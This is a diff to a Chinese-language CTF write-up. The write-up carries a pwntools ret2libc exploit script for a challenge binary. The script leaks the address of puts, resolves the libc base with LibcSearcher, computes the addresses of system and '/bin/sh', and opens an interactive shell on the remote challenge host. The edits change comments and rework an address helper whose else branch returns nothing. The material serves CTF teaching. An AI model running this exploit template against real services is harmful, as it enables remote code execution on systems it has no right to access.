@@ -88,7 +88,7 @@ b'a' * (0x50+0x8) # 溢出的大小
 ```python
 def payload(url, port):
     context(arch="amd64",os="linux",log_level="debug")
-    elf = ELF('./pwn') # 文件路径
+    elf = ELF('./pwn')
     p = remote(url,port)
     # 指令地址
     pop_rdi_ret = 0x400c83
@@ -114,7 +114,10 @@ def payload(url, port):
     libc_base = put - libc.dump('puts')
     # 获取system和sh
     def addr(hx):
-        return libc_base + libc.dump('system')
+        if hx != '':
+            return libc_base + libc.dump(hx)
+        else:
+            hx = ''
     sys_addr = addr('system')
     sh_addr = addr('str_bin_sh')
     print(hex(sys_addr),hex(sh_addr))
@@ -126,10 +129,9 @@ def payload(url, port):
     p.interactive()
 
 if __name__ == '__main__':
-    from pwn import *  # 导入pwntools库 
-    # Windows没有库的话，安装命令：pip install pwntools
-    from LibcSearcher import *  # 导入LibcSearcher库 
-    url = ''  # 题目地址
+    from pwn import *  # 导入pwntools库  安装命令：pip install pwntools
+    from LibcSearcher import *  # 导入LibcSearcher库
+    url = ''  # 完整的题目地址
     payload(url.split(":")[0], url.split(":")[1])  # 调用payload函数进行渗透
 ```
 ### 运行提示
